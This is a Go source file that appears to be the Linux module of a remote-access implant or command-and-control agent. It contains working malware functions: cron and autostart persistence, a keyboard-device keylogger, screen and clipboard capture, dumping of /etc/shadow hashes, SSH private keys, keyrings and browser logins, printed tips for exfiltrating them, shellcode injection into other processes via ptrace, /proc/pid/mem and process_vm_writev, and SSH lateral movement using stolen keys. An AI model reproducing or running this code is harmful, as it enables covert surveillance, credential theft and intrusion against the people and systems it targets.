//go:build linux
// +build linux

package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/draw"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/ssh"
	sshagent "golang.org/x/crypto/ssh/agent"
)

// Linux platform implementations.

func setDPIAware() {
	// noop on Linux
}

// captureScreenRGBA takes a screenshot using /dev/fb0 when available, then
// falls back to import/gnome-screenshot/scrot.
func captureScreenRGBA() (*image.RGBA, error) {
	if img, err := captureFramebuffer(); err == nil {
		return img, nil
	}
	cmds := []string{
		"import -window root /tmp/_fc_screen.png",
		"gnome-screenshot -f /tmp/_fc_screen.png",
		"scrot /tmp/_fc_screen.png",
	}
	for _, cmd := range cmds {
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			continue
		}
		c := exec.Command(parts[0], parts[1:]...)
		if err := c.Run(); err == nil {
			data, err := os.ReadFile("/tmp/_fc_screen.png")
			if err == nil {
				img, err := png.Decode(bytes.NewReader(data))
				if err == nil {
					os.Remove("/tmp/_fc_screen.png")
					rgba, ok := img.(*image.RGBA)
					if ok {
						return rgba, nil
					}
					// Convert to RGBA
					b := img.Bounds()
					rgba = image.NewRGBA(b)
					draw.Draw(rgba, b, img, b.Min, draw.Src)
					return rgba, nil
				}
			}
			os.Remove("/tmp/_fc_screen.png")
		}
	}
	return nil, errors.New("no screenshot tool available")
}

func captureFramebuffer() (*image.RGBA, error) {
	sizeB, err := os.ReadFile("/sys/class/graphics/fb0/virtual_size")
	if err != nil {
		return nil, err
	}
	parts := strings.Split(strings.TrimSpace(string(sizeB)), ",")
	if len(parts) != 2 {
		return nil, errors.New("bad fb0 virtual_size")
	}
	w, err1 := strconv.Atoi(parts[0])
	h, err2 := strconv.Atoi(parts[1])
	if err1 != nil || err2 != nil || w <= 0 || h <= 0 || w > 7680 || h > 4320 {
		return nil, errors.New("invalid fb0 size")
	}
	bppB, _ := os.ReadFile("/sys/class/graphics/fb0/bits_per_pixel")
	bpp, _ := strconv.Atoi(strings.TrimSpace(string(bppB)))
	if bpp != 32 && bpp != 24 {
		return nil, errors.New("unsupported fb0 depth")
	}
	raw, err := os.ReadFile("/dev/fb0")
	if err != nil {
		return nil, err
	}
	stride := w * (bpp / 8)
	need := stride * h
	if len(raw) < need {
		return nil, errors.New("fb0 short read")
	}
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		row := raw[y*stride : y*stride+stride]
		for x := 0; x < w; x++ {
			off := x * (bpp / 8)
			img.SetRGBA(x, y, color.RGBA{R: row[off+2], G: row[off+1], B: row[off+0], A: 255})
		}
	}
	return img, nil
}

// applyHideWindow is a no-op on Linux (only meaningful on Windows)
func applyHideWindow(cmd *exec.Cmd) {
	// nothing
}

// setShellProcGroup puts shell commands in their own process group so a
// cancel/timeout can tear down the whole tree (children included) instead of
// orphaning grandchildren like cmd.Process.Kill() does.
func setShellProcGroup(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
}

// killShellProcGroup kills the process group of a Setpgid-started command;
// it falls back to the direct child if the group is already gone.
func killShellProcGroup(cmd *exec.Cmd) {
	if cmd == nil || cmd.Process == nil {
		return
	}
	if err := syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL); err != nil {
		_ = cmd.Process.Kill()
	}
}

// addPersistenceWindows is never called on linux, but provide for interface completeness
func addPersistenceWindows()      {}
func addPersistenceDarwin() error { return nil }

// addPersistenceLinux installs @reboot crontab entry and ~/.config/autostart desktop file.
func addPersistenceLinux() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("cannot resolve executable: %v", err)
	}
	absExe, err := filepath.Abs(exe)
	if err != nil {
		absExe = exe
	}

	var errs []string

	// Method 1: crontab @reboot
	cronLine := fmt.Sprintf("@reboot %s\n", absExe)
	existing, _ := exec.Command("crontab", "-l").Output()
	existingStr := string(existing)
	if !strings.Contains(existingStr, absExe) {
		newCron := existingStr
		if newCron != "" && !strings.HasSuffix(newCron, "\n") {
			newCron += "\n"
		}
		newCron += cronLine
		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		if err := cmd.Run(); err != nil {
			errs = append(errs, fmt.Sprintf("crontab install failed: %v", err))
		}
	}

	// Method 2: XDG autostart .desktop file
	home := os.Getenv("HOME")
	if home == "" {
		errs = append(errs, "HOME not set")
	} else {
		autostartDir := filepath.Join(home, ".config", "autostart")
		if err := os.MkdirAll(autostartDir, 0755); err != nil {
			errs = append(errs, fmt.Sprintf("mkdir autostart failed: %v", err))
		} else {
			desktop := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=%s
Exec=%s
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`, sanitizeLabel(persistencePrefix), absExe)
			desktopPath := filepath.Join(autostartDir, sanitizeLabel(persistencePrefix)+".desktop")
			if err := os.WriteFile(desktopPath, []byte(desktop), 0600); err != nil {
				errs = append(errs, fmt.Sprintf("write desktop file failed: %v", err))
			}
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("persistence install incomplete: %s", strings.Join(errs, "; "))
	}
	return nil
}

// removePersistenceLinux removes cron and autostart entries installed by addPersistenceLinux().
func removePersistenceLinux() string {
	exe, err := os.Executable()
	if err != nil {
		return "persistence: failed to resolve executable path: " + err.Error()
	}
	absExe, _ := filepath.Abs(exe)
	var errs []string

	// Remove crontab entry
	existing, err := exec.Command("crontab", "-l").Output()
	if err == nil {
		var newLines []string
		for _, line := range strings.Split(string(existing), "\n") {
			if !strings.Contains(line, absExe) {
				newLines = append(newLines, line)
			}
		}
		newCron := strings.Join(newLines, "\n")
		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		if out, err := cmd.CombinedOutput(); err != nil {
			errs = append(errs, fmt.Sprintf("crontab write: %v %s", err, string(out)))
		}
	}

	// Remove autostart desktop file
	home := os.Getenv("HOME")
	if home != "" {
		desktopPath := filepath.Join(home, ".config", "autostart", sanitizeLabel(persistencePrefix)+".desktop")
		if err := os.Remove(desktopPath); err != nil && !os.IsNotExist(err) {
			errs = append(errs, fmt.Sprintf("autostart remove: %v", err))
		}
	}

	if len(errs) > 0 {
		return "persistence: Linux entry cleanup incomplete: " + strings.Join(errs, "; ")
	}
	return "persistence: Linux entries removed (cron+autostart)"
}

// getLinuxDistro detects the Linux distribution from /etc/os-release.
func getLinuxDistro() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return "linux"
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "ID=") {
			return strings.Trim(strings.TrimPrefix(line, "ID="), "\"")
		}
	}
	return "linux"
}

// getActiveWindowTitle returns the active window title when xdotool is available.
func getActiveWindowTitle() string {
	out, err := exec.Command("xdotool", "getactivewindow", "getwindowname").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// getPlatformSecurityInfo returns (integrity level, isElevated, domain) for Linux.
func getPlatformSecurityInfo() (string, bool, string) {
	elevated := os.Geteuid() == 0
	integrity := "Medium"
	if elevated {
		integrity = "High"
	}
	domain, _ := os.Hostname()
	return integrity, elevated, domain
}

func keyloggerAvailable() error {
	devs := linuxKeyboardDevices()
	if len(devs) == 0 {
		return fmt.Errorf("no readable /dev/input/event* keyboard (needs root or input group)")
	}
	return nil
}

func linuxKeyboardDevices() []string {
	entries, err := os.ReadDir("/dev/input")
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		name := e.Name()
		if !strings.HasPrefix(name, "event") {
			continue
		}
		path := filepath.Join("/dev/input", name)
		f, err := os.Open(path)
		if err != nil {
			continue
		}
		f.Close()
		out = append(out, path)
	}
	return out
}

// linuxKeyName is a compact EV_KEY map for printable keys. Unmapped codes
// render as [K<n>].
func linuxKeyName(code uint16, shift bool) string {
	letters := "abcdefghijklmnopqrstuvwxyz"
	if code >= 16 && code <= 25 { // Q-P row
		row := "qwertyuiop"
		ch := row[code-16]
		if shift {
			return strings.ToUpper(string(ch))
		}
		return string(ch)
	}
	if code >= 30 && code <= 38 { // A-L row
		row := "asdfghjkl"
		ch := row[code-30]
		if shift {
			return strings.ToUpper(string(ch))
		}
		return string(ch)
	}
	if code >= 44 && code <= 50 { // Z-M row
		row := "zxcvbnm"
		ch := row[code-44]
		if shift {
			return strings.ToUpper(string(ch))
		}
		return string(ch)
	}
	_ = letters
	switch code {
	case 1:
		return "[ESC]"
	case 14:
		return "[BKSP]"
	case 15:
		return "[TAB]"
	case 28:
		return "\n"
	case 57:
		return " "
	case 2:
		if shift {
			return "!"
		}
		return "1"
	case 3:
		if shift {
			return "@"
		}
		return "2"
	case 4:
		if shift {
			return "#"
		}
		return "3"
	case 5:
		if shift {
			return "$"
		}
		return "4"
	case 6:
		if shift {
			return "%"
		}
		return "5"
	case 7:
		if shift {
			return "^"
		}
		return "6"
	case 8:
		if shift {
			return "&"
		}
		return "7"
	case 9:
		if shift {
			return "*"
		}
		return "8"
	case 10:
		if shift {
			return "("
		}
		return "9"
	case 11:
		if shift {
			return ")"
		}
		return "0"
	case 12:
		if shift {
			return "_"
		}
		return "-"
	case 13:
		if shift {
			return "+"
		}
		return "="
	}
	return fmt.Sprintf("[K%d]", code)
}

func keyloggerLoop() {
	devs := linuxKeyboardDevices()
	if len(devs) == 0 {
		if Debug {
			fmt.Println("[*] Keylogger: no readable input devices")
		}
		atomic.StoreInt32(&keylogActive, 0)
		return
	}
	f, err := os.Open(devs[0])
	if err != nil {
		atomic.StoreInt32(&keylogActive, 0)
		return
	}
	defer f.Close()

	// struct input_event on 64-bit Linux: timeval(16) + type(2) + code(2) + value(4) = 24
	buf := make([]byte, 24)
	shift := false
	for atomic.LoadInt32(&keylogActive) == 1 {
		_ = f.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := io.ReadFull(f, buf)
		if err != nil || n != 24 {
			continue
		}
		typ := binary.LittleEndian.Uint16(buf[16:18])
		code := binary.LittleEndian.Uint16(buf[18:20])
		value := int32(binary.LittleEndian.Uint32(buf[20:24]))
		if typ != 1 { // EV_KEY
			continue
		}
		if code == 42 || code == 54 { // left/right shift
			shift = value != 0
			continue
		}
		if value != 1 { // key down only
			continue
		}
		ch := linuxKeyName(code, shift)
		keylogMu.Lock()
		keylogBuffer.WriteString(ch)
		keylogMu.Unlock()
	}
}

func listProcessesForTree() ([]procNode, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}
	var nodes []procNode
	for _, e := range entries {
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue
		}
		status, err := os.ReadFile(filepath.Join("/proc", e.Name(), "status"))
		if err != nil {
			continue
		}
		n := procNode{PID: pid}
		for _, line := range strings.Split(string(status), "\n") {
			if strings.HasPrefix(line, "Name:") {
				n.Name = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
			} else if strings.HasPrefix(line, "PPid:") {
				n.PPID, _ = strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "PPid:")))
			} else if strings.HasPrefix(line, "Uid:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					n.User = fields[1]
				}
			}
		}
		if n.Name != "" {
			nodes = append(nodes, n)
		}
	}
	if len(nodes) == 0 {
		return nil, fmt.Errorf("no /proc pids readable")
	}
	return nodes, nil
}

func suspendProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("suspend only supported on Windows Go agent")
}

func resumeProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("resume only supported on Windows Go agent")
}

func killProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("killproc only supported on Windows Go agent")
}

func listWindowsWindows() (string, error) {
	return "", fmt.Errorf("window_list only supported on Windows Go agent")
}

func closeWindowWindows(target string) (string, error) {
	return "", fmt.Errorf("window_close only supported on Windows Go agent")
}

// captureClipboard reads the Linux clipboard via xclip (X11) or wl-paste (Wayland).
func captureClipboard() (string, error) {
	cmds := [][]string{{"xclip", "-o", "-selection", "clipboard"}, {"wl-paste"}}
	for _, args := range cmds {
		c := exec.Command(args[0], args[1:]...)
		out, err := c.Output()
		if err == nil && len(out) > 0 {
			return string(out), nil
		}
	}
	return "", errors.New("no clipboard tool available")
}

// setClipboard writes to the Linux clipboard via xclip (X11) or wl-copy (Wayland).
func setClipboard(text string) error {
	cmds := [][]string{{"xclip", "-i", "-selection", "clipboard"}, {"wl-copy"}}
	for _, args := range cmds {
		c := exec.Command(args[0], args[1:]...)
		c.Stdin = strings.NewReader(text)
		if err := c.Run(); err == nil {
			return nil
		}
	}
	return errors.New("no clipboard tool available")
}

// clipboardGetWindows implements clipboard read for the cross-platform dispatcher.
func clipboardGetWindows() (string, error) {
	return captureClipboard()
}

// clipboardSetWindows implements clipboard write for the cross-platform dispatcher.
func clipboardSetWindows(data string) error {
	return setClipboard(data)
}

func regGetWindows(key string) (string, error) {
	return "", fmt.Errorf("registry only on Windows")
}

func regSetWindows(path, data string) error {
	return fmt.Errorf("registry only on Windows")
}

func regDeleteWindows(key string) error {
	return fmt.Errorf("registry only on Windows")
}

// dumpsAM reads accessible credential stores on Linux.
func dumpsAM() (string, error) {
	var out strings.Builder
	home := os.Getenv("HOME")

	// Try /etc/shadow (requires root)
	if os.Geteuid() == 0 {
		data, err := os.ReadFile("/etc/shadow")
		if err == nil {
			out.WriteString("=== /etc/shadow ===\n")
			for _, line := range strings.Split(string(data), "\n") {
				if line == "" {
					continue
				}
				parts := strings.SplitN(line, ":", 9)
				if len(parts) >= 2 {
					out.WriteString(fmt.Sprintf("%s:%s\n", parts[0], parts[1]))
				}
			}
		}
	}

	// SSH private key discovery
	out.WriteString("\n=== SSH Keys ===\n")
	if home != "" {
		sshDir := filepath.Join(home, ".ssh")
		if entries, err := os.ReadDir(sshDir); err == nil {
			for _, entry := range entries {
				name := entry.Name()
				if strings.HasPrefix(name, "id_") ||
					strings.HasPrefix(name, "skey_") ||
					name == "authorized_keys" ||
					name == "authorized_keys2" ||
					name == "known_hosts" {
					keyPath := filepath.Join(sshDir, name)
					if fi, err := os.Stat(keyPath); err == nil {
						data, _ := os.ReadFile(keyPath)
						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", keyPath, fi.Size()))
						if len(data) > 0 && len(data) < 10000 {
							out.WriteString(fmt.Sprintf("%s\n", string(data)))
						}
					}
				}
			}
		} else {
			out.WriteString("[-] No ~/.ssh/ directory found\n")
		}
	}

	// GNOME Keyring discovery
	out.WriteString("\n=== GNOME Keyring ===\n")
	if home != "" {
		keyringDirs := []string{
			filepath.Join(home, ".local", "share", "keyrings"),
			filepath.Join(home, ".gnome2", "keyrings"),
		}
		found := false
		for _, krDir := range keyringDirs {
			if entries, err := os.ReadDir(krDir); err == nil {
				for _, entry := range entries {
					krPath := filepath.Join(krDir, entry.Name())
					if fi, err := os.Stat(krPath); err == nil {
						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", krPath, fi.Size()))
						found = true
					}
				}
			}
		}
		if !found {
			out.WriteString("[-] No GNOME keyring files found (try: secret-tool search --all if libsecret is installed)\n")
		}
		// Try secret-tool
		if secretOut, err := exec.Command("secret-tool", "search", "--all").Output(); err == nil {
			out.WriteString(fmt.Sprintf("[+] secret-tool results:\n%s\n", string(secretOut)))
		}
	}

	// KDE Wallet discovery
	out.WriteString("\n=== KDE Wallet ===\n")
	if home != "" {
		kwalletDirs := []string{
			filepath.Join(home, ".local", "share", "kwalletd"),
			filepath.Join(home, ".kde4", "share", "apps", "kwallet"),
			filepath.Join(home, ".kde", "share", "apps", "kwallet"),
		}
		found := false
		for _, kwDir := range kwalletDirs {
			if entries, err := os.ReadDir(kwDir); err == nil {
				for _, entry := range entries {
					kwPath := filepath.Join(kwDir, entry.Name())
					if fi, err := os.Stat(kwPath); err == nil {
						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", kwPath, fi.Size()))
						found = true
					}
				}
			}
		}
		if !found {
			out.WriteString("[-] No KDE Wallet files found\n")
		}
	}

	return out.String(), nil
}

// dumpCreds collects available credential material on this Linux host.
func dumpCreds() (string, error) {
	var out strings.Builder
	out.WriteString(fmt.Sprintf("=== Linux Credential Dump (%s) ===\n", getLinuxDistro()))
	out.WriteString(fmt.Sprintf("Elevated: %v\n\n", os.Geteuid() == 0))

	// System credentials
	if result, err := dumpsAM(); err == nil {
		out.WriteString(result)
	}

	// Browser credential stores
	out.WriteString("\n=== Browser Credential Stores ===\n")
	home := os.Getenv("HOME")
	if home != "" {
		browserPaths := []struct {
			name string
			dir  string
		}{
			{"Google Chrome", filepath.Join(home, ".config", "google-chrome")},
			{"Chromium", filepath.Join(home, ".config", "chromium")},
			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
			{"Vivaldi", filepath.Join(home, ".config", "vivaldi")},
			{"Opera", filepath.Join(home, ".config", "opera")},
		}

		for _, bp := range browserPaths {
			// Check "Default" profile
			loginData := filepath.Join(bp.dir, "Default", "Login Data")
			if fi, err := os.Stat(loginData); err == nil {
				encrypted := filepath.Join(bp.dir, "Default", "Local State")
				encInfo := ""
				if efi, err := os.Stat(encrypted); err == nil {
					encInfo = fmt.Sprintf(" (Local State: %d bytes)", efi.Size())
				}
				out.WriteString(fmt.Sprintf("[+] %s Login Data: %s (%d bytes)%s\n", bp.name, loginData, fi.Size(), encInfo))
			}
			// Check profile directories
			if entries, err := os.ReadDir(bp.dir); err == nil {
				for _, entry := range entries {
					if !entry.IsDir() || entry.Name() == "Default" {
						continue
					}
					if strings.HasPrefix(entry.Name(), "Profile") || strings.HasPrefix(entry.Name(), "Guest") {
						loginData := filepath.Join(bp.dir, entry.Name(), "Login Data")
						if fi, err := os.Stat(loginData); err == nil {
							out.WriteString(fmt.Sprintf("[+] %s Login Data (%s): %s (%d bytes)\n", bp.name, entry.Name(), loginData, fi.Size()))
						}
					}
				}
			}
		}

		// Firefox
		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
		if entries, err := os.ReadDir(firefoxDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				loginsPath := filepath.Join(firefoxDir, entry.Name(), "logins.json")
				if fi, err := os.Stat(loginsPath); err == nil {
					data, _ := os.ReadFile(loginsPath)
					out.WriteString(fmt.Sprintf("[+] Firefox logins: %s (%d bytes)\n", loginsPath, fi.Size()))
					if len(data) > 0 && len(data) < 50000 {
						out.WriteString(fmt.Sprintf("    Content preview:\n%s\n", string(data)))
					}
				}
				keyDB := filepath.Join(firefoxDir, entry.Name(), "key4.db")
				if fi, err := os.Stat(keyDB); err == nil {
					out.WriteString(fmt.Sprintf("[+] Firefox key4.db: %s (%d bytes) - decrypt offline with Firefox Decrypt\n", keyDB, fi.Size()))
				}
				cookiesDB := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
				if fi, err := os.Stat(cookiesDB); err == nil {
					out.WriteString(fmt.Sprintf("[+] Firefox cookies: %s (%d bytes)\n", cookiesDB, fi.Size()))
				}
			}
		}
	}

	out.WriteString("\n=== Browser Credential Decryption ===\n")
	out.WriteString("Chrome/Chromium/Edge: Use 'download' to exfiltrate 'Login Data' + 'Local State', decrypt with python3 -c \"import os; from Crypto.Cipher import AES; ...\"\n")
	out.WriteString("Firefox: Exfiltrate logins.json + key4.db, use firefox_decrypt.py offline\n")
	out.WriteString("SSH keys found above can be exfiltrated with 'download <path>'\n")

	return out.String(), nil
}

// ── Linux Process Injection ──────────────────────────────────────────────

const (
	sysProcessVMReadV  = 310
	sysProcessVMWriteV = 311
)

type iovec struct {
	Base *byte
	Len  uint64
}

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	switch strings.ToLower(tech) {
	case "ptrace", "ptrace_pokedata":
		return injectPtrace(int(pid), shellcode)
	case "mem", "proc_mem":
		return injectProcMem(int(pid), shellcode)
	case "process_vm_writev", "vm_writev":
		return injectProcessVMWriteV(int(pid), shellcode)
	default:
		return fmt.Errorf("unsupported Linux injection technique: %s (supported: ptrace, mem, process_vm_writev)", tech)
	}
}

func injectPtrace(pid int, shellcode []byte) error {
	// Attach to the target process
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return fmt.Errorf("ptrace attach failed: %w", err)
	}
	// Detach on every return path is best-effort: a failed detach only
	// leaves the tracee traced until it exits.
	defer func() { _ = syscall.PtraceDetach(pid) }()

	// Wait for the process to stop
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("wait4 failed: %w", err)
	}

	// Get current registers to save RIP
	var oldRegs syscall.PtraceRegs
	err = syscall.PtraceGetRegs(pid, &oldRegs)
	if err != nil {
		return fmt.Errorf("ptrace getregs failed: %w", err)
	}

	// Read the current instruction pointer
	rip := ptraceGetIP(&oldRegs)

	// Align to page boundary for the allocation
	pageSize := os.Getpagesize()
	allocAddr := (rip + uint64(pageSize)) & ^uint64(pageSize-1)

	// Write shellcode 8 bytes at a time using POKEDATA
	shellcodeLen := len(shellcode)
	alignedLen := ((shellcodeLen + 7) / 8) * 8
	padded := make([]byte, alignedLen)
	copy(padded, shellcode)

	for i := 0; i < alignedLen; i += 8 {
		var val uint64
		if i+8 <= len(padded) {
			val = binary.LittleEndian.Uint64(padded[i : i+8])
		}
		addr := allocAddr + uint64(i)
		_, err = syscall.PtracePokeData(pid, uintptr(addr), padded[i:i+8])
		if err != nil {
			return fmt.Errorf("ptrace pokedata at 0x%x failed: %w", addr, err)
		}
		_ = val
	}

	// Set instruction pointer to shellcode
	ptraceSetIP(&oldRegs, allocAddr)
	err = syscall.PtraceSetRegs(pid, &oldRegs)
	if err != nil {
		return fmt.Errorf("ptrace setregs failed: %w", err)
	}

	// Continue execution
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("ptrace cont failed: %w", err)
	}

	return nil
}

func injectProcMem(pid int, shellcode []byte) error {
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	f, err := os.OpenFile(memPath, os.O_RDWR, 0)
	if err != nil {
		return fmt.Errorf("open /proc/%d/mem failed: %w (may need CAP_SYS_PTRACE or root)", pid, err)
	}
	defer f.Close()

	// Read /proc/pid/maps to find a writable, executable region
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	mapsData, err := os.ReadFile(mapsPath)
	if err != nil {
		return fmt.Errorf("read /proc/%d/maps failed: %w", pid, err)
	}

	var targetAddr uint64
	for _, line := range strings.Split(string(mapsData), "\n") {
		// Look for rwxp or rw-p (writable region)
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}
		perms := parts[1]
		if !strings.Contains(perms, "w") {
			continue
		}
		// Parse address range
		addrRange := strings.SplitN(parts[0], "-", 2)
		if len(addrRange) != 2 {
			continue
		}
		startAddr, errS := strconv.ParseUint(addrRange[0], 16, 64)
		endAddr, errE := strconv.ParseUint(addrRange[1], 16, 64)
		if errS != nil || errE != nil {
			continue
		}
		regionLen := endAddr - startAddr
		if regionLen >= uint64(len(shellcode)) {
			targetAddr = startAddr
			if strings.Contains(perms, "x") {
				// Prefer executable region
				break
			}
		}
	}

	if targetAddr == 0 {
		return fmt.Errorf("no suitable writable region found in pid %d maps", pid)
	}

	// Write shellcode to the target address
	_, err = f.WriteAt(shellcode, int64(targetAddr))
	if err != nil {
		return fmt.Errorf("write to /proc/%d/mem at 0x%x failed: %w", pid, targetAddr, err)
	}

	return nil
}

func injectProcessVMWriteV(pid int, shellcode []byte) error {
	localIov := iovec{
		Base: &shellcode[0],
		Len:  uint64(len(shellcode)),
	}

	// First, read the process maps to find a writable region
	mapsData, err := os.ReadFile(fmt.Sprintf("/proc/%d/maps", pid))
	if err != nil {
		// Fallback: try to write to the beginning of a known writable region
		// Use a simple approach - read a remote address first via /proc/pid/mem
		return fmt.Errorf("cannot read process maps: %w", err)
	}

	var remoteAddr uint64
	for _, line := range strings.Split(string(mapsData), "\n") {
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}
		if !strings.Contains(parts[1], "w") {
			continue
		}
		addrRange := strings.SplitN(parts[0], "-", 2)
		if len(addrRange) != 2 {
			continue
		}
		start, _ := strconv.ParseUint(addrRange[0], 16, 64)
		end, _ := strconv.ParseUint(addrRange[1], 16, 64)
		if end-start >= uint64(len(shellcode)) {
			remoteAddr = start
			if strings.Contains(parts[1], "x") {
				break
			}
		}
	}

	if remoteAddr == 0 {
		return fmt.Errorf("no suitable writable region found")
	}

	remoteIov := iovec{
		Base: (*byte)(unsafe.Pointer(uintptr(remoteAddr))),
		Len:  uint64(len(shellcode)),
	}

	ret, _, errno := syscall.Syscall6(
		sysProcessVMWriteV,
		uintptr(pid),
		uintptr(unsafe.Pointer(&localIov)),
		1,
		uintptr(unsafe.Pointer(&remoteIov)),
		1,
		0,
	)
	if errno != 0 {
		return fmt.Errorf("process_vm_writev failed: errno=%d", errno)
	}
	if ret == ^uintptr(0) {
		return fmt.Errorf("process_vm_writev failed (returned -1)")
	}

	return nil
}

// ── SSH-Based Lateral Movement ───────────────────────────────────────────

func lateralMove(spec string) (string, error) {
	// Format: type|target|user|pass|cmd  (same as Windows lateral movement)
	parts := strings.SplitN(spec, "|", 5)
	if len(parts) < 2 {
		return "", fmt.Errorf("format: <type>|<target>[|<user>[|<pass>[|<cmd>]]]")
	}

	moveType := strings.ToLower(strings.TrimSpace(parts[0]))
	target := strings.TrimSpace(parts[1])
	user := ""
	pass := ""
	cmd := "whoami"
	if len(parts) > 2 {
		user = strings.TrimSpace(parts[2])
	}
	if len(parts) > 3 {
		pass = strings.TrimSpace(parts[3])
	}
	if len(parts) > 4 {
		cmd = strings.TrimSpace(parts[4])
	}

	switch moveType {
	case "ssh", "ssh_exec":
		return lateralSSH(target, user, pass, cmd)
	default:
		return "", fmt.Errorf("unsupported lateral movement type on Linux: %s (supported: ssh)", moveType)
	}
}

func lateralSSH(target, user, pass, cmd string) (string, error) {
	if user == "" {
		user = os.Getenv("USER")
	}
	if user == "" {
		user = "root"
	}

	// Try SSH with password or key
	var authMethods []ssh.AuthMethod
	if pass != "" {
		authMethods = append(authMethods, ssh.Password(pass))
	}

	// Try SSH agent
	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
		agentConn, err := net.Dial("unix", sock)
		if err == nil {
			agentClient := sshagent.NewClient(agentConn)
			authMethods = append(authMethods, ssh.PublicKeysCallback(agentClient.Signers))
		}
	}

	// Try default keys
	home := os.Getenv("HOME")
	if home != "" {
		keyFiles := []string{"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ecdsa_sk", "id_ed25519_sk"}
		for _, keyFile := range keyFiles {
			keyPath := filepath.Join(home, ".ssh", keyFile)
			if keyData, err := os.ReadFile(keyPath); err == nil {
				if signer, err := ssh.ParsePrivateKey(keyData); err == nil {
					authMethods = append(authMethods, ssh.PublicKeys(signer))
				}
			}
		}
	}

	if len(authMethods) == 0 {
		authMethods = append(authMethods, ssh.Password(""))
	}

	port := 22
	if strings.Contains(target, ":") {
		hostPort := strings.SplitN(target, ":", 2)
		target = hostPort[0]
		if p, err := strconv.Atoi(hostPort[1]); err == nil {
			port = p
		}
	}

	addr := fmt.Sprintf("%s:%d", target, port)
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            authMethods,
		// #nosec G106 -- the agent has no known_hosts store; lateral targets are operator-specified.
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return "", fmt.Errorf("SSH dial to %s@%s failed: %w", user, addr, err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("SSH session failed: %w", err)
	}
	defer session.Close()

	var stdout, stderr bytes.Buffer
	session.Stdout = &stdout
	session.Stderr = &stderr

	if err := session.Run(cmd); err != nil {
		return stdout.String(), fmt.Errorf("command failed: %w\nstderr: %s", err, stderr.String())
	}

	return stdout.String(), nil
}

// ── Process Spawning with Injection ──────────────────────────────────────

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	if targetExe == "" {
		targetExe = "/bin/sleep"
	}
	if technique == "" {
		technique = "ptrace"
	}

	// Fork + exec the target in a stopped state, inject with ptrace, then continue
	cmd := exec.Command(targetExe, "60")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return fmt.Sprintf("spawnProcess: failed to start %s: %v", targetExe, err)
	}

	pid := cmd.Process.Pid

	// Wait for the process to stop at exec
	var ws syscall.WaitStatus
	_, err := syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		_ = cmd.Process.Kill()
		return fmt.Sprintf("spawnProcess: wait4 failed: %v", err)
	}

	// Now inject the shellcode via ptrace
	err = injectPtrace(pid, shellcode)
	if err != nil {
		_ = cmd.Process.Kill()
		return fmt.Sprintf("spawnProcess: ptrace injection failed: %v", err)
	}

	// Detach and let the process run
	// Same best-effort detach rationale as above.
	_ = syscall.PtraceDetach(pid)

	return fmt.Sprintf("spawnProcess: injected %d bytes into %s (pid=%d) via %s", len(shellcode), targetExe, pid, technique)
}

// tokenInfoResult ? shared struct for token ops (defined here for Linux stubs)
type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

// executeBOF is a Linux stub (runtime.GOOS check prevents calling it)
func executeBOF(bofData []byte, args string) (string, error) {
	return "", fmt.Errorf("BOF is Windows-only")
}

// token ops stubs (runtime.GOOS check prevents calling on Linux)
